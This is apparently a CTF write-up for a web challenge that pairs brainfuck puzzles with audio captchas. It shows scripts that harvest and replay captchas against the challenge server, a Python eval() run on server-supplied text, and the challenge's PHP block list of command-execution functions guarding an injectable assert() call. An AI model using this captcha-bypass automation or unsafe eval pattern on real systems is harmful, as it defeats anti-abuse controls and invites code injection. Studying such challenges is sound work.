# Captcha Revenge (Web)

In the task we get a website which displays some brainfuck code and an audio captcha challenge.
If we have 0 captchas solved, it actually tells us the solution for the first one.
The goal is to get a certain number of correct, consecutive solutions.
Brainfuck part is rather trivial, we have challenge like:

```
Can y0u print something out of this brain-fucking c0de?
++++++++++[ > ++++++ < -]>.[-]++++++++++[ > ++++++ < -]>+++.[-]++++++++++[ > +++++++++++ < -]>++.[-]++++++++++[ > ++++++++++ < -]>++++.[-]++++++++++[ > +++++++++++ < -]>++.[-]++++++++++[ > + < -]>.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++++++.[-]++++++++++[ > ++++++++++ < -]>+.[-]++++++++++[ > ++++++++++++ < -]>.[-]++++++++++[ > +++++++++++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > ++++++ < -]>+.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > +++++ < -]>+++.[-]++++++++++[ > ++++ < -]>++++++++.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > +++++ < -]>++.[-]++++++++++[ > ++++ < -]>++.[-]++++++++++[ > +++++ < -]>+++++++.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > +++++ < -]>.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > ++++ < -]>+++.[-]++++++++++[ > +++++ < -]>++++++.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > +++++ < -]>.[-]++++++++++[ > +++++ < -]>++.[-]++++++++++[ > ++++ < -]>+++++++++.[-]++++++++++[ > ++++ < -]>+++.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > ++++ < -]>+++++++++.[-]++++++++++[ > +++++ < -]>+++++++.[-]++++++++++[ > ++++ < -]>++.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > ++++ < -]>++++++++.[-]++++++++++[ > ++++ < -]>++++++++.[-]++++++++++[ > +++++ < -]>++.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > ++++ < -]>+++.[-]++++++++++[ > ++++ < -]>+++++++++.[-]++++++++++[ > +++++ < -]>+++.[-]++++++++++[ > +++++ < -]>+++++++.[-]++++++++++[ > +++++ < -]>+++++++.[-]++++++++++[ > +++++ < -]>+++++++.[-]++++++++++[ > + < -]>.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > ++++++++++ < -]>+.[-]++++++++++[ > +++++++++ < -]>+++++++++.[-]++++++++++[ > ++++++++++ < -]>++++.[-]++++++++++[ > +++++++++++ < -]>+.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > ++++ < -]>.[-]++++++++++[ > ++++++++++ < -]>+.[-]++++++++++[ > ++++++++++++ < -]>.[-]++++++++++[ > +++++++++++ < -]>++.[-]++++++++++[ > ++++ < -]>+.[-]++++++++++[ > +++++ < -]>+++++++++.[-]++++++++++[ > + < -]>.[-]++++++++++[ > ++++++ < -]>+++.[-]++++++++++[ > ++++++ < -]>++.[-]
```

Which translates to:

```php
<?php
    $exp = 35074*93723+83241+77719*70047+15999
    echo (exp);
?>
```

There can be examples in other languages, but in all cases we have `exp = some_equation`, so we can simply eval this in python.
We grabbed some random python lib to evaluate brainfuck, and then just did:

```python
def evaluate_brainfuck(code):
    some_code = brainfuck.evaluate(code)
    bf = re.findall(r"exp = (.*)\n", some_code)[0]
    return str(eval(bf)) # let's hope they won't send anything nasty...
```

The hard part seems to be the captcha itself. We've done a fair share of those in the past, but this one was actually hard.
Stuff like Google Speech API would fail, and we couldn't simply cut this in parts and match individual numbers, because they were slight differences between captchas (pitch, speed etc).

However, we noticed that this is a `web` task and not a `ppc`!
So maybe we don't really have to solve any captchas at all?

Some dirbusting got us a hit on `.git`, which meant we could download the [source code of the challenge](source.php).

There was an interesting function:

```php
function is_clean($input){
	if (preg_match("/SESSION/i", $input)){//no seesion variable alteration
		bad_hacking_penalty();
		return false;
	}
	if (preg_match('/(base64_|eval|system|shell_|exec|php_)/i', $input)){//no coomand injection 
		bad_hacking_penalty();
		return false;
	}
	if (preg_match('/(file|echo|die|print)/i', $input)){//no file access
		bad_hacking_penalty();
		return false;
	}
	if (preg_match("/(or|\|)/", $input)){//Be brave use AND
		bad_hacking_penalty();
		return false;
	}
	if (preg_match('/(flag)/i', $input)){//don't take shortcuts
		bad_hacking_penalty();
		return false;
	}
	//clean input
	return true;
}
```

Which was used to filter our answer because it would go into `assert("'$real_ans' === '$user_ans'")` and `assert` works like `eval`, so otherwise we could actually execute code there.
It's quite obvious that intended solution was to bypass those checks and gain RCE, but we're too lazy for that.

We noticed in the code that captchas come from:

```php
function random_string(){
	$captcha_file = "xxxxxxxx";
	$random_index = rand(0, 999);
	$i = 1;
	foreach(file($captcha_file) as $line) {
   		if ($i == $random_index) return $line;
   		$i++;
	}
}
```

Which means there are only 1000 unique options to choose from.
Why not just download a lot of them and actually solve the game?
It's doable since they tell us the solution for a captcha if we have 0 solved.
We can simply do a GET to the page, download captcha, read the solution, and save the file for future:

```python
def download_captchas():
    url = "http://51.15.73.163:13335/"
    we_have = {}
    for file in os.listdir("download"):
        with codecs.open("download/" + file, "rb") as input_file:
            we_have[input_file.read()] = file
    while len(we_have) < 1000:
        r = requests.get(url)
        id = re.findall("source src=gen_cap/(.*) type=", r.text)[0]
        answer = re.findall("e.g Type '(.+?)'", r.text)[0]
        b = requests.get(url + "gen_cap/" + id).content
        if b not in we_have:
            print("new one!", len(we_have))
            we_have[b] = answer
            with codecs.open("download/" + answer, "wb") as output_file:
                output_file.write(b)
```

This code simply downloads and stores unique captchas.

In the meantime we can try to win the game with the captchas we already have.
We just go on the page, download captcha and check if we got this one.
If we do, then we send the answer.
Otherwise we start all over again:

```python
def solve():
    while True:
        try:
            captchas = {}
            for file in os.listdir("download"):
                with codecs.open("download/" + file, "rb") as input_file:
                    captchas[input_file.read()] = file
            url = "http://51.15.73.163:13335/"
            r = s.get(url)
            for i in range(501):
                brainfuck = re.findall("c0de\?<br>\n(.*?)</div>", r.text, re.DOTALL)[0]
                brainfuck = brainfuck.replace("&gt;", ">").replace("&lt;", "<")
                id = re.findall("source src=gen_cap/(.*) type=", r.text)[0]
                b = requests.get(url + "gen_cap/" + id).content
                brainfuck_answer = evaluate_brainfuck(brainfuck)
                captcha_solution = captchas[b]
                r = s.post(url, data={"captcha": captcha_solution, "answer": brainfuck_answer}, cookies={"PHPSEESSID": "p4rulezz"})
                print(r.text)
            break
        except KeyError:
            print("missing captcha :(")
            pass
```

This code will loop until we actually get the flag.
It took a while to download enough examples to win, but in the end we got: `CTF{too_many_captchas_but_PHP_made_it_a_cakewalk}`
But in our case PHP didn't really help at all.
